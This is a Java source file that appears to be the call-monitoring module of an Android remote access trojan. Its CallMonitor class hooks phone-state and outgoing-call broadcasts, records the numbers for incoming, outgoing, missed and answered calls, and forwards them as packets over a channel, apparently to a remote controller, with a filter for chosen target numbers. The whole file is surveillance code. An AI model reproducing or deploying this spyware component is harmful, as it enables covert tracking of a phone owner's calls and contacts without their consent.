package my.app.Library;

import java.util.HashSet;

import my.app.client.ClientListener;
import utils.EncoderHelper;
import Packet.CallStatusPacket;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.TelephonyManager;
import android.util.Log;

public class CallMonitor {

	ClientListener ctx;
	HashSet<String> phoneNumberFilter;
	int channel;
	Boolean isCalling = false;

	protected BroadcastReceiver Callreceiver = new BroadcastReceiver() {
		private static final String TAG = "CallReceiver";

		@Override
		public void onReceive(final Context context, final Intent intent) {
			// Log.i(TAG, "Call state changed !");
			final String action = intent.getAction();

			if (action.equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
				final String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
				Log.i(TAG, "Outgoing call to " + number);
				CallMonitor.this.ctx.handleData(CallMonitor.this.channel, new CallStatusPacket(4,
					number).build());
				CallMonitor.this.isCalling = true;
			} else if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {

				final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
				final String phoneNumber = intent
					.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

				if (phoneNumber != null && CallMonitor.this.phoneNumberFilter != null)
					if (!CallMonitor.this.phoneNumberFilter.contains(phoneNumber))
						return;

				if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING))
					// Log.i(TAG,"Incoming call of"+phoneNumber);
					CallMonitor.this.ctx.handleData(CallMonitor.this.channel, new CallStatusPacket(
						1, phoneNumber).build());
				else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
					if (phoneNumber == null) {
						Log.i(TAG, "Hang Up/Refused");
						CallMonitor.this.ctx.handleData(CallMonitor.this.channel,
							new CallStatusPacket(5, phoneNumber).build());
					} else {
						Log.i(TAG, "Missed call of " + phoneNumber); // not null
																		// call
																		// missed,
																		// null
																		// hang
																		// up,
																		// or
																		// refused
						CallMonitor.this.ctx.handleData(CallMonitor.this.channel,
							new CallStatusPacket(2, phoneNumber).build());
					}
					CallMonitor.this.isCalling = false;
				} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))
					if (!CallMonitor.this.isCalling) {
						Log.i(TAG, "Reçu décroché of " + phoneNumber);
						CallMonitor.this.ctx.handleData(CallMonitor.this.channel,
							new CallStatusPacket(3, phoneNumber).build());
					}
			}
		}

	};

	public CallMonitor(ClientListener c, int chan, byte[] args) {
		this.ctx = c;
		this.channel = chan;
		this.phoneNumberFilter = EncoderHelper.decodeHashSet(args);
		final IntentFilter filter = new IntentFilter();
		filter.addAction("android.intent.action.PHONE_STATE"); // On enregistre
																// un broadcast
																// receiver sur
																// la reception
																// de SMS
		filter.addAction("android.intent.action.NEW_OUTGOING_CALL");
		this.ctx.registerReceiver(this.Callreceiver, filter);
	}

	public void stop() {
		this.ctx.unregisterReceiver(this.Callreceiver);
	}

}
